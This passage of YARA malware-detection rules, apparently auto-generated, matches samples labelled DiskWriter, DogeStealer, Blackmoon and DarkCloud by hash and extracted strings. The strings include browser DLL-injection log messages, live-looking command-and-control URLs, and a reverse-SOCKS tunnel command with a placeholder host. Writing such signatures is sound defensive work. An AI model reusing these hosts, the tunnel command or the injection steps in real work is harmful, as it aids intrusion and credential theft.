      hash1 = "ede06c68f12c54bc37fe79457f7e5321fdab7e986d687c33c1eabf6ca2e4a1a6"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "OnExecuteH" fullword ascii /* score: '18.00'*/
      $s10 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s12 = "Shared.CommonFunc" fullword ascii /* score: '17.00'*/
      $s13 = "SystemtfH" fullword ascii /* base64 encoded string*/ /* score: '17.00'*/
      $s14 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s15 = "TComponent.GetObservers$0$Intf" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule e30793412d9aaa49ffe0dbaaf834b6ef6600541abea418b274290447ca2e168b_e3079341 {
   meta:
      description = "_subset_batch - file e30793412d9aaa49ffe0dbaaf834b6ef6600541abea418b274290447ca2e168b_e3079341.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e30793412d9aaa49ffe0dbaaf834b6ef6600541abea418b274290447ca2e168b"
   strings:
      $x1 = "&Attempt to execute domain logon script" fullword ascii /* score: '32.00'*/
      $s2 = "get_AttemptDomainLogonScript" fullword ascii /* score: '30.00'*/
      $s3 = "ExecuteLogonScript" fullword ascii /* score: '29.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.0-c000 79.dabacbb, 2021/04" ascii /* score: '27.00'*/
      $s6 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c006 79.dabacbb, 2021/04" ascii /* score: '27.00'*/
      $s7 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c006 79.dabacbb, 2021/04" ascii /* score: '27.00'*/
      $s8 = "Copyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoLight3.000;NeWT;Nunito-LightNunito LightVersion 3.000Nun" ascii /* score: '26.00'*/
      $s9 = "Copyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoBlack3.000;NeWT;Nunito-BlackNunito BlackVersion 3.000Nun" ascii /* score: '26.00'*/
      $s10 = "Copyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoExtraLight3.000;NeWT;Nunito-ExtraLightNunito ExtraLightV" ascii /* score: '26.00'*/
      $s11 = "Copyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoExtraBold3.000;NeWT;Nunito-ExtraBoldNunito ExtraBoldVers" ascii /* score: '26.00'*/
      $s12 = "Copyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoSemiBold3.000;NeWT;Nunito-SemiBoldNunito SemiBoldVersion" ascii /* score: '26.00'*/
      $s13 = "?Copyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoBold3.000;NeWT;Nunito-BoldNunito BoldVersion 3.000Nunit" ascii /* score: '26.00'*/
      $s14 = "cCopyright 2014 The Nunito Project Authors (contact@sansoxygen.com)NunitoRegular3.000;NeWT;Nunito-RegularNunito RegularVersion 3" ascii /* score: '26.00'*/
      $s15 = "LCopyright 2014 The Nunito Project Authors (contact@sansoxygen.com)Nunito BlackRegular3.000;NeWT;Nunito-BlackNunito BlackVersion" wide /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      1 of ($x*) and 4 of them
}

rule DonutLoader_signature__6290304c212496bd9db73c6c633cbd70_imphash_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_6290304c212496bd9db73c6c633cbd70(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7b84a4fd1fa2d4fa0fa0abd1d76b5074375728c53f78af259ba49b1a18d4b73"
   strings:
      $s1 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule DiskWriter_signature__50f8680fb721bb0fd315ec9fbe155906_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_50f8680fb721bb0fd315ec9fbe155906(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f47d027f4eb8d1ca986a2e723397101d4368268285f79a95e59581794b8eca5"
   strings:
      $s1 = "D:\\Downloads\\Hydrogen-Peaceful-main\\Hydrogen-Peaceful-main\\src\\Release\\hydrogenExtended-GDIonly.pdb" fullword ascii /* score: '25.00'*/
      $s2 = "Hydrogen.exe" fullword wide /* score: '22.00'*/
      $s3 = "Hydrogen.exe - LAST WARNING" fullword wide /* score: '22.00'*/
      $s4 = "hydrogen.exe" fullword wide /* score: '22.00'*/
      $s5 = "What you have just executed is NOT a malware." fullword wide /* score: '14.00'*/
      $s6 = "Still execute it?" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__127fde9b {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_127fde9b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "127fde9b3c238f66232d0f0db1d3ff62d2c46d16f50aa92073d26977f36f463a"
   strings:
      $x1 = "AteraNLogger.exe" fullword wide /* score: '32.00'*/
      $s2 = "AlphaControlCommandPerformerRunPackage.Perform(): performLogParams.ShouldDownload is true: " fullword wide /* score: '29.00'*/
      $s3 = "ShouldPostCommandExecutionErrorToCloud" fullword ascii /* score: '27.00'*/
      $s4 = "AteraAgent.exe" fullword wide /* score: '27.00'*/
      $s5 = "D:\\a\\74\\s\\AlphaAgent\\trunk\\AlphaControlAgent\\obj\\Release\\AteraAgent.pdb" fullword ascii /* score: '27.00'*/
      $s6 = "AlphaAgent.exe" fullword wide /* score: '27.00'*/
      $s7 = "AteraNLogger.exe.config" fullword wide /* score: '27.00'*/
      $s8 = "AteraAgentWD.exe" fullword wide /* score: '27.00'*/
      $s9 = "Dism.exe /Online /Get-FeatureInfo /FeatureName:NetFx3 | FIND \"State\" | find \"Disable\" && Dism.exe /Online /Enable-Feature /F" wide /* score: '26.00'*/
      $s10 = "Failed to run unins000.exe" fullword wide /* score: '25.00'*/
      $s11 = "packageExecutableCommandArgs" fullword ascii /* score: '24.00'*/
      $s12 = "agent-api-{0}.atera.com" fullword wide /* score: '23.00'*/
      $s13 = "Unsupported operation - {0}, statusCode: {1}, error: {2}, errorData: {3}" fullword wide /* score: '23.00'*/
      $s14 = "failed to get process.Modules[0].FileName fi.Name = " fullword wide /* score: '23.00'*/
      $s15 = "process of command {0} still has not exited after {1} seconds." fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule DogeStealer_signature__9cd3c3703cd3ac13b42be9c7c07f92f8_imphash_ {
   meta:
      description = "_subset_batch - file DogeStealer(signature)_9cd3c3703cd3ac13b42be9c7c07f92f8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "247c3c7771abfb8b3e82a27305444b3be887af18a6dce0c57f0ffefb765c915f"
   strings:
      $x1 = "Writing payload DLL to target process." fullword ascii /* score: '34.00'*/
      $s2 = "Failed to determine target process architecture." fullword ascii /* score: '28.00'*/
      $s3 = "Allocating memory for payload in target process." fullword ascii /* score: '25.00'*/
      $s4 = "GetModuleHandleW for ntdll.dll failed." fullword ascii /* score: '24.00'*/
      $s5 = "Creating new thread in target to execute ReflectiveLoader." fullword ascii /* score: '23.00'*/
      $s6 = "brave.exe" fullword wide /* score: '22.00'*/
      $s7 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s8 = "Waiting for payload execution. (Pipe: " fullword ascii /* score: '22.00'*/
      $s9 = "NtWriteVirtualMemory for payload DLL failed: " fullword ascii /* score: '21.00'*/
      $s10 = "  chrome_inject.exe [options] <chrome|brave|edge|all>" fullword wide /* score: '21.00'*/
      $s11 = "Loading and decrypting payload DLL." fullword ascii /* score: '20.00'*/
      $s12 = "Waiting for payload to connect to named pipe." fullword ascii /* score: '19.00'*/
      $s13 = "Payload signaled completion or pipe interaction ended." fullword ascii /* score: '19.00'*/
      $s14 = "Payload connected to named pipe." fullword ascii /* score: '19.00'*/
      $s15 = "CreateProcessW failed. Error: " fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule Blackmoon_signature__0e3222fb8b5a86a21b7918502c652365_imphash_ {
   meta:
      description = "_subset_batch - file Blackmoon(signature)_0e3222fb8b5a86a21b7918502c652365(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b0c551797d2a03abf305cd306ea17dc04219be31c5247452fc915dfd6515621e"
   strings:
      $s1 = "E_Loader.dll" fullword ascii /* score: '29.00'*/
      $s2 = "Items.dll" fullword ascii /* score: '23.00'*/
      $s3 = "EBIRCSBUS" fullword ascii /* reversed goodware string 'SUBSCRIBE' */ /* score: '21.50'*/
      $s4 = "EBIRCSBUSNU" fullword ascii /* reversed goodware string 'UNSUBSCRIBE' */ /* score: '21.50'*/
      $s5 = "\\mface.dll" fullword ascii /* score: '21.00'*/
      $s6 = "tnuoCnipSdnAnoitceSlacitirCezilaitinI" fullword ascii /* reversed goodware string 'InitializeCriticalSectionAndSpinCount' */ /* score: '19.00'*/
      $s7 = "noitceSlacitirCevaeL" fullword ascii /* reversed goodware string 'LeaveCriticalSection' */ /* score: '19.00'*/
      $s8 = "noitceSlacitirCeteleD" fullword ascii /* reversed goodware string 'DeleteCriticalSection' */ /* score: '19.00'*/
      $s9 = "noitceSlacitirCretnE" fullword ascii /* reversed goodware string 'EnterCriticalSection' */ /* score: '19.00'*/
      $s10 = "rotpircsed elif daB" fullword ascii /* reversed goodware string 'Bad file descriptor' */ /* score: '19.00'*/
      $s11 = "noitpircseDeliF" fullword wide /* reversed goodware string 'FileDescription' */ /* score: '19.00'*/
      $s12 = "ofnirddaeerf" fullword ascii /* reversed goodware string 'freeaddrinfo' */ /* score: '18.00'*/
      $s13 = "sseccus" fullword ascii /* reversed goodware string 'success' */ /* score: '18.00'*/
      $s14 = "ofnirddateg" fullword ascii /* reversed goodware string 'getaddrinfo' */ /* score: '18.00'*/
      $s15 = "rotarepo" fullword ascii /* reversed goodware string 'operator' */ /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule d3e5a7e4b9ed79e8d7909bd4ca22a96b_imphash_ {
   meta:
      description = "_subset_batch - file d3e5a7e4b9ed79e8d7909bd4ca22a96b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b2363d3759ef8b676f398fc413c56a1058b8bc9c5633f24c55538e5ba501afb"
   strings:
      $x1 = "/////////lVVby9zJYYeQWA0m0az4heBtdckIcoHw912//QmisyWP-uTqo0uBxa8Pazh6bkhP2xTjNn1LzbQb-1NnAtRMw3qwNEmTdHatVXEpjhIPw080biO5Kvv3aqB" ascii /* score: '45.00'*/
      $x2 = "FZupF/ypFxvisQifyQhp9Runz-ypFZOpqYiahggjEtiX7ZSjF/ipTshpF/ypFBxfqQAdbw8gUoSksoCawoBorkineIxpF/ypFZeoF/ypFZAjcwuXDAvnLUSa7tvnoUCk" ascii /* score: '44.00'*/
      $x3 = "m/////////MntzIXrANX-YD29UD7WO4faG1QTVvRGzK9Y098J-GukM2p9MFniqukvhBepCp0Q8TUEfNH7Jdj3teoUA4TvplHtkKCuZ804DbpdKFJ4OUMX6PfNnKOR7tA" ascii /* score: '41.00'*/
      $x4 = "m///VnCwUpsVPMvdzlStOYtWalG3PyVVyDFfFBdT66cF0nz1iNwhxmlHj65GsTi2keE8nyMZFOHK-8tvUXl1K8jpNbgJIfqRzL84sM4HS30WSn2znYlcnNOD3v5X0ZA9" ascii /* score: '32.00'*/
      $s5 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii /* score: '20.00'*/
      $s6 = "eGdg7ANhA-ZU//FXkVn////l5nFTp-////dSoTxzqItibq8/0mtju0mjTku-VmtZxZ4yKYe34dv///F06100bQr51kCImxB0CpCTp-///ldUmp/z4otj9huFxz//-3x5" ascii /* score: '19.00'*/
      $s7 = "/q6yz70V/uy//xFxm1/////q-HSDpJtj////dgzwqThc/BljM9FT/B/zmfFTPE8z7mt//ROxNy///hdUmxV1yz///7dUmpl1yzysxQtjVuyj/FF4seFTt6ZT7F1VtYQg" ascii /* score: '19.00'*/
      $s8 = "pCpCpCpCpCpCpC3FX2Af////VjZVtUYT/lVr7VX7EVx////PRF7Tt2W0XUq56Otjye6y/et/vVZSg3W3sTRoqTB/DU/v1otj08GetSnFEhR9sTh1sTxlRFeSt2m0XJy5" ascii /* score: '16.00'*/
      $s9 = "000000G0Aa00COsN0q0Se103ar50CS6O0m0QX103e160DysP0C1eK2G6KNC0OiCl0a1q13G5lAA00OG1000000G4GM80PSzn0W1ow206BpB0OiCl0Wnoy206BpB0OiCl" ascii /* score: '16.00'*/
      $s10 = "KzDLlJr/LzGLVKrBLzJLFLrNLzML/LrZLzPLlMrlLzSLVNrxLzlLFOr7MzYL/OrJMzbLlPrVMzeLVQrhMzhLFRrtMzkL/Vr3NznLlSrFNzqLVTrRNztLFUrdNzwL/Urp" ascii /* score: '16.00'*/
      $s11 = "sDR9sTh4EhF5mie4xzBBsTBAMFRxCsWntgJRm/BAMBB0FFR0ywFTpwTZuOyiZllSoQVZDOyjilkSrkY/okZrokZTs2YrsYYro2ZTos0dpMRZfOiimc88MVB2sThEj1/l" ascii /* score: '16.00'*/
      $s12 = "IrsYR5DCsELXX0QiPq6IOcTAvNFMZ5a7EQyec7D0bxi5qJZNsJNT8ZWg7R7uZgir20HDpymZzzzTg18lFX/R1Tk5P7Jv0htq8d8ao87jQrruBlp9vIJhCgetzqaQTm/W" ascii /* score: '16.00'*/
      $s13 = "vln/rfJzqtqmV/Z/foozD9r09OxTfz9EWmlw54GEtgZMAYBSou2CYJN8iARDHSfwrHFjgbLchoc/xijS5UumF2JCyoDOHMq3DGFSbfN086hiBs8oE/vZ5iYHZPBThNDc" ascii /* score: '16.00'*/
      $s14 = "DRRfPgCpyMvnlwvp8RRlOchjzADhsshjhURlSADlLMgkMUPpF/SlDdwfj6RiEhvY9VvpF/SjzQho6hPaEQwotsCiElhYG2TiqQghMgeZAtvn9hCbxkAcew8ivwipskhj" ascii /* score: '16.00'*/
      $s15 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9a1c79a1 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9a1c79a1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9a1c79a123da49a41082787f91a54e23ec1d2403c628faad349145b4af472066"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADI" fullword ascii /* score: '27.00'*/
      $s2 = "KLed.exe" fullword wide /* score: '22.00'*/
      $s3 = "KLed.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "get_ShowSystemFiles" fullword ascii /* score: '12.00'*/
      $s5 = "Directory Plus - Bookmarks" fullword wide /* score: '12.00'*/
      $s6 = "bookmarks.xml" fullword wide /* score: '10.00'*/
      $s7 = "Error exporting bookmarks: " fullword wide /* score: '10.00'*/
      $s8 = "Error importing bookmarks: " fullword wide /* score: '10.00'*/
      $s9 = "get_EmptyFolders" fullword ascii /* score: '9.00'*/
      $s10 = "<GetBookmarks>b__8_0" fullword ascii /* score: '9.00'*/
      $s11 = "get_LargestFiles" fullword ascii /* score: '9.00'*/
      $s12 = "GetDirectorySizes" fullword ascii /* score: '9.00'*/
      $s13 = "get_FileTypeSizes" fullword ascii /* score: '9.00'*/
      $s14 = "get_ConfirmDelete" fullword ascii /* score: '9.00'*/
      $s15 = "GetFilesAndFolders" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__75a7477e {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_75a7477e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "75a7477e1c60a33509a35964510f9b37679f8ae8136a476a2bb73ac16435a35e"
   strings:
      $s1 = "Hakims.exe" fullword wide /* score: '22.00'*/
      $s2 = "tmpqbpoec.tmp" fullword ascii /* score: '17.00'*/
      $s3 = "rnateEncoding and AlternateEncodingUsage instead." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule DiskWriter_signature__027be59081662e40c7e00ab2ad8ef629_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_027be59081662e40c7e00ab2ad8ef629(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ed8f2d69568e0b5c67afa1bcf69b5bece5796ad4ccb034b1df6f6e9463ceae7"
   strings:
      $x1 = "C:\\Users\\Roberio\\Desktop\\Soleraium-Destructive\\x64\\Debug\\Soleraium-Destructive.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "Soleraium-Destructive has an error. Error - GET PRANKED BUDDIE!!1!!111!11!" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and all of them
}

rule DiskWriter_signature__34c8135064117b5bdfaffe1f6067ee2a_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_34c8135064117b5bdfaffe1f6067ee2a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "328e7dd90f55fb054ed6846faadd951388e98974226d110be5c1a0bbac05bf3d"
   strings:
      $x1 = "C:\\Users\\Anton\\source\\repos\\Project23\\Project23\\x64\\Debug\\Project23.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "write.exe" fullword ascii /* score: '22.00'*/
      $s3 = "CYADIANIUM.EXE FINAL WARNING" fullword ascii /* score: '14.00'*/
      $s4 = "CYADIANIUM.EXE WARNING" fullword ascii /* score: '14.00'*/
      $s5 = "copyToTemp" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and all of them
}

rule DiskWriter_signature__8571a92fe29b8969b1a2ee0424454392_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_8571a92fe29b8969b1a2ee0424454392(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec18f895ccd8d97c5d9f06b1ab9ce0697ab40224a31a94571b117561cd579749"
   strings:
      $x1 = "C:\\Users\\randomGuy\\Desktop\\WINTILE 2\\x64\\Debug\\WINTILE 2.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "The software you just executed is considered malware." fullword wide /* score: '14.00'*/
      $s3 = "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen." fullword wide /* score: '14.00'*/
      $s4 = "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?" fullword wide /* score: '14.00'*/
      $s5 = "STILL EXECUTE IT?" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and all of them
}

rule DiskWriter_signature__8ab5bb7aa8c19801f127fb589ed567a0_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_8ab5bb7aa8c19801f127fb589ed567a0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4a5ed6d1846225d23ff81f79cdcc78830c5995a49ddeab341350d253a9b5281"
   strings:
      $x1 = "C:\\Users\\Roberio\\Desktop\\Soleraium-Safety\\x64\\Debug\\Soleraium-Safety.pdb" fullword ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*)
}

rule Blackmoon_signature__bb20d7e7bca493919373b753bfaf2d22_imphash_ {
   meta:
      description = "_subset_batch - file Blackmoon(signature)_bb20d7e7bca493919373b753bfaf2d22(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "492553d834fd0f43c00a1f8cd8d33e2797ab5745807d372f7cf6fc086168d1c4"
   strings:
      $s1 = "3DExplor.dll" fullword ascii /* score: '23.00'*/
      $s2 = "\\svchost.exe" fullword ascii /* score: '21.00'*/
      $s3 = "\\svchosts.exe" fullword ascii /* score: '21.00'*/
      $s4 = "\\SimFlash_New.dll" fullword ascii /* score: '21.00'*/
      $s5 = "z>kernel32.dll" fullword ascii /* score: '20.00'*/
      $s6 = "https://api.ip138.com/ip/?datatype=txt&token=" fullword ascii /* score: '20.00'*/
      $s7 = "http://124.248.65.166:88/jack2022.txt" fullword ascii /* score: '19.00'*/
      $s8 = "http://lb.jnmoyu.com:66/plug.txt" fullword ascii /* score: '17.00'*/
      $s9 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* score: '12.00'*/
      $s10 = "program internal error number is %d. " fullword ascii /* score: '10.00'*/
      $s11 = "BlackMoon RunTime Error:" fullword ascii /* score: '10.00'*/
      $s12 = "Content-type: text/plain; charset=\"" fullword ascii /* score: '9.00'*/
      $s13 = "=\"=,=4=B=`=}=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'K' */
      $s14 = "blackmoon" fullword ascii /* score: '8.00'*/
      $s15 = "Accept: */* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule DiskWriter_signature__9ff96b6c2600322be57c9fc461203706_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_9ff96b6c2600322be57c9fc461203706(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8060e56dcdba7bf0147003c99d1fd51e7188585042c47bc285b8d0fa6c5bbdb6"
   strings:
      $s1 = "Noskidium.exe" fullword wide /* score: '22.00'*/
      $s2 = "C:/crossdev/src/winpthreads-git20141130/src/mutex.c" fullword ascii /* score: '18.00'*/
      $s3 = "mutex_global_static_shmem" fullword ascii /* score: '15.00'*/
      $s4 = "mutex_global_shmem" fullword ascii /* score: '15.00'*/
      $s5 = "The software you just executed is considered malware." fullword wide /* score: '14.00'*/
      $s6 = "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen." fullword wide /* score: '14.00'*/
      $s7 = "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?" fullword wide /* score: '14.00'*/
      $s8 = "STILL EXECUTE IT?" fullword wide /* score: '14.00'*/
      $s9 = "not enough space for format expansion (Please submit full bug report at http://gcc.gnu.org/bugs.html):" fullword ascii /* score: '13.00'*/
      $s10 = "_pthread_key_dest_shmem" fullword ascii /* score: '10.00'*/
      $s11 = "_pthread_key_sch_shmem" fullword ascii /* score: '10.00'*/
      $s12 = "_pthread_key_lock_shmem" fullword ascii /* score: '10.00'*/
      $s13 = "_pthread_key_max_shmem" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule dbcc1a0e0407a7ce388ff63308f3ce8d_imphash_ {
   meta:
      description = "_subset_batch - file dbcc1a0e0407a7ce388ff63308f3ce8d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e27c13e42d49b9d4ed5a29f4335ce73e642a9d4fe01cca6b179d1f8b7f916888"
   strings:
      $s1 = "7ckBvY3Rq" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s2 = "AYAYAY" fullword ascii /* reversed goodware string*/ /* score: '13.50'*/
      $s3 = "YiHz.GCY" fullword ascii /* score: '10.00'*/
      $s4 = "* w/7U},qbf" fullword ascii /* score: '9.00'*/
      $s5 = "> /C(CRKX3\\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 24000KB and
      all of them
}

rule cf062c59c145831833830b6ecf5248d2_imphash_ {
   meta:
      description = "_subset_batch - file cf062c59c145831833830b6ecf5248d2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9c3675a533729bedd9ba1b750b017761d5f9130ec68a4941f9a9328fa97e3609"
   strings:
      $s1 = "GameData.dll" fullword ascii /* score: '23.00'*/
      $s2 = "NDSound.dll" fullword ascii /* score: '23.00'*/
      $s3 = "RoleView.dll" fullword ascii /* score: '23.00'*/
      $s4 = "GraphicData.dll" fullword ascii /* score: '23.00'*/
      $s5 = "Chat.dll" fullword ascii /* score: '23.00'*/
      $s6 = "Role3D.dll" fullword ascii /* score: '23.00'*/
      $s7 = "TqPackage.dll" fullword ascii /* score: '23.00'*/
      $s8 = "Assist.dll" fullword ascii /* score: '23.00'*/
      $s9 = "graphic.dll" fullword ascii /* score: '23.00'*/
      $s10 = "soul.exe" fullword wide /* score: '22.00'*/
      $s11 = "?TqFGetVersion@@YAJXZ" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule e9637b8a8e9594cf2e9b38c7c21a9cb673f7e008a104d6248c277a9abf0d3847_e9637b8a {
   meta:
      description = "_subset_batch - file e9637b8a8e9594cf2e9b38c7c21a9cb673f7e008a104d6248c277a9abf0d3847_e9637b8a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9637b8a8e9594cf2e9b38c7c21a9cb673f7e008a104d6248c277a9abf0d3847"
   strings:
      $s1 = "get_kernel_syms" fullword ascii /* score: '14.00'*/
      $s2 = "klogctl" fullword ascii /* score: '13.00'*/
      $s3 = "getspent" fullword ascii /* score: '13.00'*/
      $s4 = "getspnam" fullword ascii /* score: '13.00'*/
      $s5 = "pmap_getport" fullword ascii /* score: '12.00'*/
      $s6 = "fgets_unlocked" fullword ascii /* score: '9.00'*/
      $s7 = "getspnam_r" fullword ascii /* score: '9.00'*/
      $s8 = "fgetgrent_r" fullword ascii /* score: '9.00'*/
      $s9 = "getspent_r" fullword ascii /* score: '9.00'*/
      $s10 = "fgetpwent_r" fullword ascii /* score: '9.00'*/
      $s11 = "pmap_getmaps" fullword ascii /* score: '9.00'*/
      $s12 = "endspent" fullword ascii /* score: '8.00'*/
      $s13 = "sigsetmask" fullword ascii /* score: '8.00'*/
      $s14 = "setspent" fullword ascii /* score: '8.00'*/
      $s15 = "swapoff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule c4b185fc6a9ca983e00f1684a13ef4e1_imphash_ {
   meta:
      description = "_subset_batch - file c4b185fc6a9ca983e00f1684a13ef4e1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2304b74766101034ddf9e7be3c5ccf3fe22273a8b3181e6d755d6588a39ba49b"
   strings:
      $s1 = "* _(lY" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule e11f69b49b6f2e829454371c31ebf86893f82a042dae3f2faf63dcd84f97a584_e11f69b4 {
   meta:
      description = "_subset_batch - file e11f69b49b6f2e829454371c31ebf86893f82a042dae3f2faf63dcd84f97a584_e11f69b4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e11f69b49b6f2e829454371c31ebf86893f82a042dae3f2faf63dcd84f97a584"
   strings:
      $s1 = " ./ew -s rssocks --refHost xxx.xxx.xxx.xxx --refPort 8888" fullword ascii /* score: '23.00'*/
